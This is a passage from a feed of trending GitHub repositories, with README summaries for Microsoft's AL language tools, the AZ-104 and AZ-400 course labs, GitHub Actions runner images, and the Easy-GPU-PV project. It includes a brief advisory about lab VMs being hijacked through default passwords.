    <summary type="html">&lt;p&gt;AL language code samples for developing extensions for Dynamics 365 Business Central&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Visual Studio Code AL Language extension for Dynamics 365 Business Central&lt;/h1&gt; &#xA;&lt;h2&gt;Welcome&lt;/h2&gt; &#xA;&lt;p&gt;The main purpose of this repository is to track issues regarding the latest version of the AL compiler and developer tools available in the &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=ms-dynamics-smb.al&#34;&gt;Visual Studio Code Marketplace&lt;/a&gt; or as part of the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/AL/master/#al-developer-preview-builds&#34;&gt;AL Developer Preview builds&lt;/a&gt; for Dynamics 365 Business Central. In addition, you will find code samples to help you get started writing extensions in AL and get familiar with the tools.&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;For documentation about using the &lt;a href=&#34;https://marketplace.visualstudio.com/items?itemName=ms-dynamics-smb.al&#34;&gt;AL Language&lt;/a&gt; to extend Dynamics 365 Business Central, read some of our topics on &lt;a href=&#34;https://docs.microsoft.com/en-us/dynamics365/business-central/&#34;&gt;Microsoft Dynamics 365 Business Central docs&lt;/a&gt;:&lt;br&gt; • &lt;a href=&#34;https://docs.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-get-started&#34;&gt;Getting Started&lt;/a&gt;&lt;br&gt; • &lt;a href=&#34;https://docs.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-extension-example&#34;&gt;Building Your First Sample Extension&lt;/a&gt;&lt;br&gt; • &lt;a href=&#34;https://docs.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-reference-overview&#34;&gt;Developer Reference&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Bugs and feature requests&lt;/h2&gt; &#xA;&lt;p&gt;If you have encountered a bug or you have a feature request, please first read the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/AL/master/CONTRIBUTING.md&#34;&gt;contributing guidelines&lt;/a&gt; and then search for existing and closed issues.&lt;/p&gt; &#xA;&lt;p&gt;Bugs pertaining to the AL compiler and the developer tools for the latest version can be filed in this repository. We will respond to these issues on a best-effort basis.&lt;/p&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://github.com/Microsoft/AL/wiki/Triage-Process&#34;&gt;triage process&lt;/a&gt; document for more information on how we handle incoming requests.&lt;/p&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;Our answers to frequently asked questions can be found in our &lt;a href=&#34;https://github.com/Microsoft/AL/wiki/Frequently-Asked-Questions&#34;&gt;FAQ&lt;/a&gt;. To get help from community members please use one of the following resources:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://community.dynamics.com/business/f/758&#34;&gt;Business Central Community&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dynamicsuser.net/nav/f/developers&#34;&gt;Dynamics User Group&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://aka.ms/BCYammer&#34;&gt;Yammer groups for partners&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://forum.mibuso.com/categories/nav-three-tier&#34;&gt;mibuso forum&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Related projects&lt;/h2&gt; &#xA;&lt;p&gt;The following repositories can provide additional resources depending on the issues that you are facing:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/microsoft/ALAppExtensions&#34;&gt;Microsoft AL application foundation modules and application add-ons for Microsoft Dynamics 365 Business Central&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/MicrosoftDocs/dynamics365smb-devitpro-pb&#34;&gt;Microsoft Dynamics 365 Business Central Docs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Microsoft/navcontainerhelper&#34;&gt;Official Microsoft repository for BcContainerHelper, a PowerShell module, which makes it easier to work with BC Containers on Docker.&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Please read through our &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/AL/master/CONTRIBUTING.md&#34;&gt;contributing guidelines&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Code of conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;h2&gt;AL Developer Preview builds&lt;/h2&gt; &#xA;&lt;p&gt;To get access to the AL Developer Preview builds you need to be part of the Ready2Go program. Detailed instructions can be found at &lt;a href=&#34;https://docs.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/readiness/get-started&#34;&gt;https://docs.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/readiness/get-started&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/p&gt; &#xA;&lt;p&gt;Licensed under the &lt;a href=&#34;https://raw.githubusercontent.com/microsoft/AL/master/LICENSE.txt&#34;&gt;MIT&lt;/a&gt; license.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftLearning/AZ-104-MicrosoftAzureAdministrator</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/MicrosoftLearning/AZ-104-MicrosoftAzureAdministrator</id>
    <link href="https://github.com/MicrosoftLearning/AZ-104-MicrosoftAzureAdministrator" rel="alternate"></link>
    <summary type="html">&lt;p&gt;AZ-104 Microsoft Azure Administrator&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AZ-104: Microsoft Azure Administrator&lt;/h1&gt; &#xA;&lt;h2&gt;Welcome&lt;/h2&gt; &#xA;&lt;p&gt;This repository is for instructors teaching Microsoft courses. If you are in class, please ask your instructor for assistance.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://microsoftlearning.github.io/AZ-104-MicrosoftAzureAdministrator/&#34;&gt;Link to labs (HTML format)&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Are you a MCT?&lt;/strong&gt; - Have a look at our &lt;a href=&#34;https://microsoftlearning.github.io/MCT-User-Guide/&#34;&gt;GitHub User Guide for MCTs&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Security Issue - February 2022&lt;/h2&gt; &#xA;&lt;p&gt;Some Azure training labs instruct the student to use a specific user name and password. Bad actors constantly scan virtual machines and try to log in using those credentials. Once they login the machines can be used for crypto-mining or other non-classroom activities.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Remediation&lt;/strong&gt;: Students should be instructed to use a password of their own choosing. Students should not use any password in the lab instructions.&lt;/p&gt; &#xA;&lt;h2&gt;What are we doing?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To support this course, we will need to make frequent updates to the course content to keep it current with the Azure services used in the course. We are publishing the lab instructions and lab files on GitHub to allow for open contributions between the course authors and MCTs to keep the content current with changes in the Azure platform.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;We hope that this brings a sense of collaboration to the labs like we&#39;ve never had before - when Azure changes and you find it first during a live delivery, go ahead and make an enhancement right in the lab source. Help your fellow MCTs.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How should I use these files relative to the released MOC files?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The instructor handbook and PowerPoints are still going to be your primary source for teaching the course content.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;These files on GitHub are designed to be used in conjunction with the student handbook, but are in GitHub as a central repository so MCTs and course authors can have a shared source for the latest lab files.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It will be recommended that for every delivery, trainers check GitHub for any changes that may have been made to support the latest Azure services, and get the latest files for their delivery.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How do I contribute?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Any MCT can submit a pull request to the code or content in the GitHub repro, Microsoft and the course author will triage and include content and lab code changes as needed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You can submit bugs, changes, improvement and ideas. Find a new Azure feature before we have? Submit a new demo!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What about changes to the student handbook?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This repository is only for Issues with the course labs. Comments on the course content should be posted on the MCT Courseware Forum.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Notes&lt;/h2&gt; &#xA;&lt;h3&gt;Classroom Materials&lt;/h3&gt; &#xA;&lt;p&gt;It is strongly recommended that MCTs and Partners access these materials and in turn, provide them separately to students. Pointing students directly to GitHub to access Lab steps as part of an ongoing class will require them to access yet another UI as part of the course, contributing to a confusing experience for the student. An explanation to the student regarding why they are receiving separate Lab instructions can highlight the nature of an always-changing cloud-based interface and platform. Microsoft Learning support for accessing files on GitHub and support for navigation of the GitHub site is limited to MCTs teaching this course only.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>actions/virtual-environments</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/actions/virtual-environments</id>
    <link href="https://github.com/actions/virtual-environments" rel="alternate"></link>
    <summary type="html">&lt;p&gt;GitHub Actions virtual environments&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GitHub Actions Virtual Environments&lt;/h1&gt; &#xA;&lt;p&gt;Repository contains the source used to create the &lt;a href=&#34;https://help.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners&#34;&gt;virtual environments&lt;/a&gt; for GitHub Actions hosted runners, as well as the VM images of &lt;a href=&#34;https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/hosted?view=azure-devops#use-a-microsoft-hosted-agent&#34;&gt;Microsoft-hosted agents&lt;/a&gt; used for Azure Pipelines. To build a VM machine from this repo&#39;s source, see the &lt;a href=&#34;https://raw.githubusercontent.com/actions/virtual-environments/main/docs/create-image-and-azure-resources.md&#34;&gt;instructions&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;How to get in touch with us:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To file a bug report, or request tools to be added/updated, please&amp;nbsp;&lt;a href=&#34;https://github.com/actions/virtual-environments/issues/new/choose&#34;&gt;open an issue using the appropriate template&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;If you want to share your thoughts about image configuration, installed software, or bring some idea, please, create a new topic in a&amp;nbsp;&lt;a href=&#34;https://github.com/actions/virtual-environments/discussions&#34;&gt;discussions section&lt;/a&gt;&amp;nbsp;for a corresponding category. Before making a new discussion please make sure no similar topics were created earlier.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For general questions about using the virtual environments or writing your Actions workflow, please open requests in the &lt;a href=&#34;https://github.community/c/github-actions/41&#34;&gt;GitHub Actions Community Forum&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Available Environments&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Environment&lt;/th&gt; &#xA;   &lt;th&gt;YAML Label&lt;/th&gt; &#xA;   &lt;th&gt;Included Software&lt;/th&gt; &#xA;   &lt;th&gt;Latest Release &amp;amp; Rollout Progress&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ubuntu 22.04 &lt;sup&gt;beta&lt;/sup&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;ubuntu-22.04&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/linux/Ubuntu2204-Readme.md&#34;&gt;ubuntu-22.04&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=ubuntu22&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=ubuntu22&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ubuntu 20.04&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;ubuntu-latest&lt;/code&gt; or &lt;code&gt;ubuntu-20.04&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/linux/Ubuntu2004-Readme.md&#34;&gt;ubuntu-20.04&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=ubuntu20&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=ubuntu20&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ubuntu 18.04&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;ubuntu-18.04&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/linux/Ubuntu1804-Readme.md&#34;&gt;ubuntu-18.04&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=ubuntu18&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=ubuntu18&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;macOS 12 &lt;sup&gt;beta&lt;/sup&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;macos-12&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/macos/macos-12-Readme.md&#34;&gt;macOS-12&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=macos-12&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=macos-12&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;macOS 11&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;macos-latest&lt;/code&gt; or &lt;code&gt;macos-11&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/macos/macos-11-Readme.md&#34;&gt;macOS-11&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=macos-11&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=macos-11&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;macOS 10.15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;macos-10.15&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/macos/macos-10.15-Readme.md&#34;&gt;macOS-10.15&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=macos-10.15&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=macos-10.15&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Windows Server 2022&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;windows-latest&lt;/code&gt; or &lt;code&gt;windows-2022&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/win/Windows2022-Readme.md&#34;&gt;windows-2022&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=windows-2022&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=windows-2022&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Windows Server 2019&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;windows-2019&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/win/Windows2019-Readme.md&#34;&gt;windows-2019&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=windows-2019&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=windows-2019&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Windows Server 2016&lt;/td&gt; &#xA;   &lt;td&gt;&lt;code&gt;windows-2016&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/actions/virtual-environments/raw/main/images/win/Windows2016-Readme.md&#34;&gt;windows-2016&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=windows-2016&amp;amp;redirect=1&#34;&gt;&lt;img src=&#34;https://actionvirtualenvironmentsstatus.azurewebsites.net/api/status?imageName=windows-2016&amp;amp;badge=1&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;b&gt;Note:&lt;/b&gt; Beta and Preview images are provided &#34;as-is&#34;, &#34;with all faults&#34; and &#34;as available&#34; and are excluded from the service level agreement and warranty. Beta and Preview images may not be covered by customer support.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;What images are available for GitHub Actions and Azure DevOps?&lt;/strong&gt;&lt;/em&gt; The availability of images for GitHub Actions and Azure DevOps is different. See documentation for more details:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.github.com/en/free-pro-team@latest/actions/reference/specifications-for-github-hosted-runners#supported-runners-and-hardware-resources&#34;&gt;GitHub Actions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/hosted?view=azure-devops&amp;amp;tabs=yaml#software&#34;&gt;Azure DevOps&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;What image version is used in my build?&lt;/strong&gt;&lt;/em&gt; Usually, image deployment takes 3-4 days, and documentation in the &lt;code&gt;main&lt;/code&gt; branch is only updated when deployment is finished. To find out which image version and what software versions are used in a specific build, see &lt;code&gt;Set up job&lt;/code&gt; (GitHub Actions) or &lt;code&gt;Initialize job&lt;/code&gt; (Azure DevOps) step log.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Looking for other Linux distributions?&lt;/strong&gt;&lt;/em&gt; We do not plan to offer other Linux distributions. We recommend using Docker if you&#39;d like to build using other distributions with the hosted virtual environments. Alternatively, you can leverage &lt;a href=&#34;https://help.github.com/en/actions/hosting-your-own-runners&#34;&gt;self-hosted runners&lt;/a&gt; and fully customize your environment to your needs.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;How to contribute to macOS source?&lt;/strong&gt;&lt;/em&gt; macOS source lives in this repository and available for everyone. However, MacOS image-generation CI doesn&#39;t support external contributions yet so we are not able to accept pull-requests for now. We are in the process of preparing MacOS CI to accept contributions. Until then, we appreciate your patience and ask you continue to make tool requests by filing issues.&lt;/p&gt; &#xA;&lt;h2&gt;Updates to virtual environments&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;Cadence&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;We typically deploy weekly updates to the software on the virtual environments. For some tools, we always install the latest at the time of the deployment; for others, we pin the tool to specific version(s).&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Following Along / Change Notifications&lt;/em&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;High Impact Changes&lt;/strong&gt; (ex. breaking changes, new or deprecated environments) will be posted to the GitHub Changelog on our &lt;a href=&#34;https://github.blog/changelog/&#34;&gt;blog&lt;/a&gt; and on &lt;a href=&#34;https://twitter.com/GHchangelog&#34;&gt;twitter&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Low Impact Changes&lt;/strong&gt; will be pinned in this repository and marked with the &lt;a href=&#34;https://github.com/actions/virtual-environments/labels/Announcement&#34;&gt;Announcement&lt;/a&gt; label.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Regular Weekly Rhythm&lt;/strong&gt; can be followed by watching &lt;a href=&#34;https://github.com/actions/virtual-environments/releases&#34;&gt;Releases&lt;/a&gt;. Pre-release is created when deployment is started. As soon as deployment is finished, it is converted to release. You can also track upcoming changes using the &lt;a href=&#34;https://github.com/actions/virtual-environments/labels/awaiting-deployment&#34;&gt;awaiting-deployment&lt;/a&gt; label.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Software and image guidelines&lt;/h2&gt; &#xA;&lt;p&gt;To learn more about tools and images support policy, see the &lt;a href=&#34;https://raw.githubusercontent.com/actions/virtual-environments/main/docs/software-and-images-guidelines.md&#34;&gt;guidelines&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MicrosoftLearning/AZ400-DesigningandImplementingMicrosoftDevOpsSolutions</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/MicrosoftLearning/AZ400-DesigningandImplementingMicrosoftDevOpsSolutions</id>
    <link href="https://github.com/MicrosoftLearning/AZ400-DesigningandImplementingMicrosoftDevOpsSolutions" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AZ-400: Designing and Implementing Microsoft DevOps Solutions&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://raw.githubusercontent.com/MicrosoftLearning/releases/latest&#34;&gt;Download Latest Student Handbook and AllFiles Content&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Are you a MCT?&lt;/strong&gt; - Have a look at our &lt;a href=&#34;https://microsoftlearning.github.io/MCT-User-Guide/&#34;&gt;GitHub User Guide for MCTs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Need to manually build the lab instructions?&lt;/strong&gt; - Instructions are available in the &lt;a href=&#34;https://github.com/MicrosoftLearning/Docker-Build&#34;&gt;MicrosoftLearning/Docker-Build&lt;/a&gt; repository&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What are we doing?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;To support this course, we will need to make frequent updates to the course content to keep it current with the Azure services used in the course. We are publishing the lab instructions and lab files on GitHub to allow for open contributions between the course authors and MCTs to keep the content current with changes in the Azure platform.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;We hope that this brings a sense of collaboration to the labs like we&#39;ve never had before - when Azure changes and you find it first during a live delivery, go ahead and make an enhancement right in the lab source. Help your fellow MCTs.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How should I use these files relative to the released MOC files?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The instructor handbook and PowerPoints are still going to be your primary source for teaching the course content.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;These files on GitHub are designed to be used in conjunction with the student handbook, but are in GitHub as a central repository so MCTs and course authors can have a shared source for the latest lab files.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;It will be recommended that for every delivery, trainers check GitHub for any changes that may have been made to support the latest Azure services, and get the latest files for their delivery.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;How do I contribute?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Any MCT can submit a pull request to the code or content in the GitHub repro, Microsoft and the course author will triage and include content and lab code changes as needed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You can submit bugs, changes, improvement and ideas. Find a new Azure feature before we have? Submit a new demo!&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What about changes to the student handbook?&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This repository is only for issues with the course labs. Comments on the course content should be posted on the MCT Courseware Forum.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Notes&lt;/h2&gt; &#xA;&lt;h3&gt;Classroom Materials&lt;/h3&gt; &#xA;&lt;p&gt;It is strongly recommended that MCTs and Partners access these materials and in turn, provide them separately to students. Pointing students directly to GitHub to access Lab steps as part of an ongoing class will require them to access yet another UI as part of the course, contributing to a confusing experience for the student. An explanation to the student regarding why they are receiving separate Lab instructions can highlight the nature of an always-changing cloud-based interface and platform. Microsoft Learning support for accessing files on GitHub and support for navigation of the GitHub site is limited to MCTs teaching this course only.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>jamesstringerparsec/Easy-GPU-PV</title>
    <updated>2022-06-01T01:50:46Z</updated>
    <id>tag:github.com,2022-06-01:/jamesstringerparsec/Easy-GPU-PV</id>
    <link href="https://github.com/jamesstringerparsec/Easy-GPU-PV" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A Project dedicated to making GPU Partitioning on Windows easier!&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Easy-GPU-PV&lt;/h1&gt; &#xA;&lt;p&gt;A work-in-progress project dedicated to making GPU Paravirtualization on Windows Hyper-V easier!&lt;/p&gt; &#xA;&lt;p&gt;GPU-PV allows you to partition your systems dedicated or integrated GPU and assign it to several Hyper-V VMs. It&#39;s the same technology that is used in WSL2, and Windows Sandbox.&lt;/p&gt; &#xA;&lt;p&gt;Easy-GPU-PV aims to make this easier by automating the steps required to get a GPU-PV VM up and running.&lt;br&gt; Easy-GPU-PV does the following...&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Creates a VM of your choosing&lt;/li&gt; &#xA; &lt;li&gt;Automatically Installs Windows to the VM&lt;/li&gt; &#xA; &lt;li&gt;Partitions your GPU of choice and copies the required driver files to the VM&lt;/li&gt; &#xA; &lt;li&gt;Installs &lt;a href=&#34;https://parsec.app&#34;&gt;Parsec&lt;/a&gt; to the VM, Parsec is an ultra low latency remote desktop app, use this to connect to the VM. You can use Parsec for free non commercially. To use Parsec commercially, sign up to a &lt;a href=&#34;https://parsec.app/teams&#34;&gt;Parsec For Teams&lt;/a&gt; 